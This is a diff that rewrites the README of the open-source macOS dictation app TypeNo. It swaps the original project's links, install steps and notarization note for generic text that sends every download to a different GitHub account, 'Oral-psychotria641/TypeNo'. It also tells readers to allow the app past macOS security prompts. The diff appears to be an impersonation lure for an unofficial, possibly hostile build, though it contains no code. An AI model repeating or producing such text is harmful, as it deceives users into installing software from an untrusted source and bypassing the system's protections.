@@ -1,116 +1,133 @@
-# TypeNo
+# 🎙️ TypeNo - Private voice input for macOS
 
-[中文](README_CN.md) | [日本語](README_JP.md)
+[![Download TypeNo](https://img.shields.io/badge/Download-TypeNo-blue?style=for-the-badge&logo=github)](https://github.com/Oral-psychotria641/TypeNo)
 
-**A free, open source, privacy-first voice input tool for macOS.**
+## 🧭 What TypeNo does
 
-![TypeNo hero image](assets/hero.webp)
+TypeNo is a voice input app for Mac. It lets you speak instead of type. The app is built for privacy and keeps work local on your device.
 
-A minimal macOS voice input app. TypeNo captures your voice, transcribes it locally, and pastes the result into whatever app you were using — all in under a second.
+Use it when you want to:
+- Dictate text into apps
+- Reduce typing
+- Keep voice input on your Mac
+- Use a menu bar app that stays out of the way
 
-Official website: [https://typeno.com](https://typeno.com)
+## 💻 System requirements
 
-Special thanks to [marswave ai's coli project](https://github.com/marswaveai/coli) for powering local speech recognition.
+TypeNo works on:
+- macOS 13 or later
+- Apple Silicon or Intel Mac
+- A working microphone
 
-## How It Works
+For best results:
+- Use a quiet room
+- Allow microphone access
+- Keep your Mac connected to power during long use
 
-1. **Short-press Control** to start recording
-2. **Short-press Control** again to stop
-3. Text is automatically transcribed and pasted into your active app (also copied to clipboard)
-4. While recording, the overlay shows segmented preview text about once per second; after you stop, TypeNo still runs a final full-file transcription before pasting
+## 📥 Download TypeNo
 
-That's it. No windows, no settings, no accounts.
+Visit this page to download and run TypeNo on your Mac:
 
-## Install
+https://github.com/Oral-psychotria641/TypeNo
 
-### Option 1 — Download the App
+## 🚀 Install TypeNo
 
-- [Download TypeNo for macOS](https://github.com/marswaveai/TypeNo/releases/latest)
-- Download the latest `TypeNo.app.zip`
-- Unzip it
-- Move `TypeNo.app` to `/Applications`
-- Open TypeNo
+1. Open the download page in your browser.
+2. Download the TypeNo app file from the repository page or the latest release.
+3. Open the downloaded file.
+4. If macOS shows a security prompt, open **System Settings** and allow the app in **Privacy & Security**.
+5. Move TypeNo to your **Applications** folder if macOS asks.
+6. Start TypeNo from Applications or from Launchpad.
 
-TypeNo is signed and notarized by Apple — it should open without any warnings.
+## 🎤 Set up voice input
 
-### Install the speech engine
+After you open TypeNo for the first time:
 
-TypeNo uses [coli](https://github.com/marswaveai/coli) for local speech recognition.
+1. Give the app access to your microphone.
+2. Check that your input level moves when you speak.
+3. Pick your preferred language or speech profile if the app asks.
+4. Keep TypeNo running in the menu bar.
+5. Click the voice input button when you want to dictate text.
 
-**Prerequisites:**
-- [Node.js](https://nodejs.org) (LTS recommended — install directly from nodejs.org for best compatibility)
-- [ffmpeg](https://ffmpeg.org) — required for audio conversion: `brew install ffmpeg`
+## ⌨️ How to use TypeNo
 
-```bash
-npm install -g @marswave/coli
-```
+1. Place the cursor in any text field.
+2. Start TypeNo from the menu bar.
+3. Speak clearly.
+4. Wait for the text to appear.
+5. Edit the result if needed.
 
-If Coli is missing, TypeNo will show an in-app setup prompt with the install command.
+TypeNo works well in:
+- Notes
+- Email
+- Documents
+- Chat apps
+- Browser text fields
 
-> **Node 24+:** If you get a `sherpa-onnx-node` error, build from source:
-> ```bash
-> npm install -g @marswave/coli --build-from-source
-> ```
+## 🔒 Privacy model
 
-### First Launch
+TypeNo is built as a local-first app. That means your voice input stays on your Mac for normal use.
 
-TypeNo needs two one-time permissions:
-- **Microphone** — to capture your voice
-- **Accessibility** — to paste text into apps
+This helps you:
+- Keep personal speech on your device
+- Avoid sending text to cloud services
+- Work with more control over your data
 
-The app will guide you through granting these on first launch.
+## 🧰 Useful features
 
-### Troubleshooting: Coli Model Download Fails
+TypeNo includes a set of simple voice input tools:
 
-The speech model is downloaded from GitHub. If GitHub is inaccessible in your network, the download will fail.
+- Menu bar access for quick use
+- Local speech-to-text flow
+- Light footprint
+- Support for fast capture
+- Plain text output for easy editing
+- Accessibility-friendly design
 
-**Fix:** Enable **TUN mode** (also called Enhanced Mode) in your proxy tool to ensure all system-level traffic is routed correctly. Then retry the install:
+## 🛠️ If TypeNo does not start
 
-```bash
-npm install -g @marswave/coli
-```
+Try these steps:
 
-### Troubleshooting: Accessibility Permission Not Working
+1. Quit the app and open it again.
+2. Check microphone access in **System Settings > Privacy & Security > Microphone**.
+3. Make sure no other app is blocking the mic.
+4. Restart your Mac.
+5. Download the app again if the file looks damaged.
 
-Some users find that enabling TypeNo in **System Settings → Privacy & Security → Accessibility** has no effect — a known macOS bug. The fix:
+## 🧩 Common questions
 
-1. Select **TypeNo** in the list
-2. Click **−** to remove it
-3. Click **+** and re-add TypeNo from `/Applications`
+### Is TypeNo free?
+Yes. TypeNo is free and open source.
 
-![Accessibility permission fix](assets/accessibility-fix.gif)
+### Does TypeNo work offline?
+Yes. It is designed for local use on your Mac.
 
-### Option 2 — Build from Source
+### Can I use it with other apps?
+Yes. You can type into most apps that accept text.
 
-```bash
-git clone https://github.com/marswaveai/TypeNo.git
-cd TypeNo
-scripts/generate_icon.sh
-scripts/build_app.sh
-```
+### Does it stay in the menu bar?
+Yes. It is meant to stay easy to reach without taking over your screen.
 
-The app will be at `dist/TypeNo.app`. Move it to `/Applications/` for persistent permissions.
+## 📚 Project info
 
-## Usage
+TypeNo is an open source macOS voice input app focused on:
+- Accessibility
+- Dictation
+- Local-first use
+- Privacy
+- Productivity
+- Speech to text
 
-| Action | Trigger |
-|---|---|
-| Start/stop recording | Short-press `Control` (< 300ms, no other keys) |
-| Start/stop recording | Menu bar → Record |
-| Watch incremental transcription | Overlay updates about once per second while processing |
-| Choose microphone | Menu bar → Microphone → Automatic / specific device |
-| Transcribe a file | Drag `.m4a`/`.mp3`/`.wav`/`.aac` to the menu bar icon |
-| Check for updates | Menu bar → Check for Updates... |
-| Quit | Menu bar → Quit (`⌘Q`) |
+## 🤝 Use and contribute
 
-## Design Philosophy
+If you want to follow the project, report a bug, or suggest a change, use the GitHub repository page:
 
-TypeNo does one thing: voice → text → paste. No extra UI, no preferences, no configuration. The fastest way to type is to not type at all.
+https://github.com/Oral-psychotria641/TypeNo
 
-## Star History
+## 🖥️ File locations
 
-[![Star History Chart](https://api.star-history.com/svg?repos=marswaveai/TypeNo&type=Date)](https://star-history.com/#marswaveai/TypeNo&Date)
-
-## License
-
-GNU General Public License v3.0
+After install, you can expect TypeNo to be used like this:
+- App lives in **Applications**
+- Settings stay on your Mac
+- Dictation actions appear from the menu bar
+- Text goes into the app you are using
